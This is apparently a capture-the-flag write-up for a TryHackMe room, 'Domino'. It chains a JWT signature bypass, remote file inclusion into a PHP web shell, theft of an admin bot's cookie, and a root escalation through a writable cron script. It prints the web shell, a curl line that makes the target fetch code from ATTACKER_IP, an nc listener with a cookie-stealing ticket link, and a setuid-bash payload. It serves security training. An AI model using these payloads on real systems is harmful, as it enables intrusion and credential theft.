# TryHackMe: Domino — Writeup

**Room:** [Domino](https://tryhackme.com/room/domino)
**Difficulty:** Medium
**Category:** Web Exploitation, Linux Privilege Escalation

## Overview

Domino is a web exploitation box chaining several vulnerabilities in a fictional
company's ("NexusCorp") internal portal: weak secret management, a JWT signature
bypass, Local/Remote File Inclusion, a blind-XSS-style admin bot, and a writable
monitoring script leading to root.

## Skills Demonstrated

- Static analysis of leaked frontend JavaScript for hardcoded secrets
- AES-ECB decryption with a recovered key
- JWT signature-verification bypass
- Session cookie forgery (HMAC) vs. a properly signed cookie flow
- Remote File Inclusion → Remote Code Execution
- Local File Inclusion for source code disclosure
- Exploiting an internal "admin bot" for session hijacking
- Linux privilege escalation via file permission misconfiguration

---

## 1. Recon & Initial Information Disclosure

The target exposed a backup folder containing `config.enc`, an AES-128-ECB
encrypted file, along with a note pointing to `static/app.js` for the
decryption key.

Inspecting `app.js` revealed a hardcoded key left in a developer comment:

```js
// Encryption key for backup config decryption - AES-ECB-128
// Key: N3xusK3y2024!!  (pad to 16 bytes with [null])
```

**Lesson:** Never ship secrets in client-side JavaScript — anything sent to
the browser is fully readable by the user.

## 2. Decrypting the Backup Config

AES-128-ECB requires a 16-byte key; the leaked key was only 14 bytes, so it
needed padding. A null-byte pad worked:

```python
from Crypto.Cipher import AES

key = b'N3xusK3y2024!!' + b'\x00\x00'
with open('config.enc', 'rb') as f:
    ciphertext = f.read()

cipher = AES.new(key, AES.MODE_ECB)
plaintext = cipher.decrypt(ciphertext)
print(plaintext)
```

This decrypted to a small JSON config:

```json
{
  "app_name": "NexusCorp Portal",
  "version": "2.3.1",
  "deploy_env": "production",
  "system_user": "devops"
}
```

The `system_user: devops` field was a strong hint for later privilege
escalation.

## 3. Login Enumeration

The portal's login page required a `firstname.lastname` format username. An
"Our Team" page on the site leaked valid employee names, enabling a
targeted login attempt that succeeded for a standard employee account.
This yielded the first flag, found in the admin user's profile notes.

## 4. Breaking the Session/Token Scheme

The app used two parallel auth mechanisms:

**a) A custom signed cookie** (`nexus_session`):

```
base64(json_payload) . HMAC-SHA256(base64_payload, APP_SECRET)
```

Properly verified server-side — tampering with the payload without the
correct `APP_SECRET` was rejected.

**b) A JWT**, obtainable from `/api/auth/token.php` after login, intended for
API access (`Authorization: Bearer <token>`). Reading the backend source (see
LFI step below) revealed:

```php
function verify_jwt($token) {
    ...
    // Signature check intentionally disabled
    // if (!hash_equals($parts[2], $expected)) return null;
    if (isset($payload['exp']) && $payload['exp'] < time()) return null;
    return $payload;
}
```

**The signature was never actually checked.** The JWT payload could be freely
modified — including the `role` claim — and re-encoded without needing to
know the signing secret at all:

```python
import base64, json
payload = {"sub": "username", "role": "admin", "iat": ..., "exp": ...}
forged_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode()
# header.forged_payload.anything — signature is never checked
```

This forged `role: admin` JWT granted access to admin-only API endpoints.

**Lesson:** Signature verification being "temporarily" disabled during
development is a common and catastrophic real-world mistake — always enforce
signature checks on every token path, not just the ones exercised in
happy-path testing.

## 5. Remote Code Execution via RFI

With an admin JWT, `/api/files.php?name=<path>` became accessible. Reading
its own source (`?name=/var/www/html/api/files.php`) revealed the core flaw:

```php
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    ...
    eval(str_replace("<?php", "", $remote));
    ...
}
```

Any `name` parameter starting with `http://` or `https://` is fetched and
**directly `eval()`'d as PHP**, before the path-traversal protection further
down even runs. This is a textbook **Remote File Inclusion → Remote Code
Execution**.

Hosting a small payload and pointing the parameter at it granted shell
access:

```php
<?php system($_GET['cmd']); ?>
```

```bash
curl "http://TARGET/api/files.php?name=http://ATTACKER_IP:8000/shell.php&cmd=id" \
  -H "Authorization: Bearer <forged_jwt>"
```

A reverse shell payload upgraded this to an interactive shell as `www-data`,
and the root-owned `flag3.txt` dropped on disk during RCE provided the third
flag.

## 6. Source Disclosure: Database & Secret Recovery

With shell access (and independently, via the same LFI), the application's
`config.php` and `auth.php` were read directly:

```php
define('DB_PASS', 'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');
```

These confirmed the JWT/cookie secrets and provided working MySQL
credentials.

## 7. Admin Bot Session Hijack

Reading `/var/www/html/support/*.php` revealed a support-ticket feature with
no output sanitization on stored messages. A root-owned background process
(`/opt/admin_bot.py`, run via a dedicated systemd service) was found polling
unread tickets:

```python
COOKIE = dict(nexus_session=make_session_cookie())  # a real, properly-signed admin cookie

def process(t):
    urls = re.findall(r"https?://[A-Za-z0-9./_?&=:%+-]+", t["message"])
    for url in set(urls):
        requests.get(url, cookies=COOKIE, timeout=5)
```

The bot extracts **any URL found in a ticket message** and fetches it,
attaching its own authenticated admin session cookie. Submitting a ticket
containing a link to an attacker-controlled listener captured the real,
properly-signed `nexus_session` cookie for the admin account:

```bash
nc -lvnp 8000
```

Ticket message:

```
Please check this: http://ATTACKER_IP:8000/steal
```

Within the bot's poll interval, the admin cookie arrived on the listener.
Using that cookie in a browser granted full, legitimately authenticated
access to the admin panel, revealing the second flag.

**Lesson:** Any internal automation that "acts like a user" on your behalf
(reviewing tickets, clicking links, rendering content) is a prime target for
blind SSRF/XSS-style attacks. Bot credentials deserve the same care as a
real privileged user's.

## 8. Privilege Escalation: www-data → devops → root

The decrypted backup config from step 2 hinted at a `devops` system account.
Password reuse — a running theme on this box — meant the database password
(`D3v0ps!2024`) also worked as the `devops` Linux account's login password:

```bash
su devops
# Password: D3v0ps!2024
```

This also recovered the fourth flag, sitting in the `devops` home directory.

`devops` had no sudo rights and no interesting group memberships. Enumeration
of `/opt/` turned up a monitoring script with a permissions misconfiguration:

```bash
ls -la /opt/monitoring/health_report.sh
# -rwxrwxr-- 1 root devops ... health_report.sh
```

The script is owned by `root` but **group-writable by `devops`**, and is
executed periodically as root by a scheduled task. Overwriting it with
a privilege escalation payload and waiting for its next scheduled run
granted root:

```bash
cat > /opt/monitoring/health_report.sh << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
```

Once the script executed on its next scheduled run:

```bash
/bin/bash -p
id
# uid=0(root)
```

This produced the final, root flag.

**Lesson:** Group-writable permissions on scripts executed by privileged
cron jobs or services are a classic and easily-overlooked privilege
escalation vector. Write access should always be as restrictive as the
executing context allows.

---

## Summary of Vulnerabilities Chained

| #   | Vulnerability                                                        | Impact                                       |
| --- | -------------------------------------------------------------------- | -------------------------------------------- |
| 1   | Hardcoded encryption key in client-side JS                           | Config disclosure                            |
| 2   | JWT signature verification disabled                                  | Authentication bypass / privilege escalation |
| 3   | Remote File Inclusion via unchecked URL scheme in file-read endpoint | Remote Code Execution                        |
| 4   | Credential reuse across DB and system accounts                       | Lateral movement                             |
| 5   | Unsanitized input rendered to a privileged "admin bot"               | Session hijacking                            |
| 6   | Password reuse (DB password = system account password)               | User-level access                            |
| 7   | Group-writable script executed by a privileged scheduler             | Privilege escalation to root                 |

## Flags

- Flag 1 (admin user's profile notes): `THM{redacted}`
- Flag 2 (admin panel): `THM{redacted}`
- Flag 3 (RCE, `/opt/flag3.txt`): `THM{redacted}`
- Flag 4 (devops home directory): `THM{redacted}`
- Flag 5 (root): `THM{redacted}`

_Flags redacted per CTF writeup etiquette. Complete the room yourself to
retrieve them._
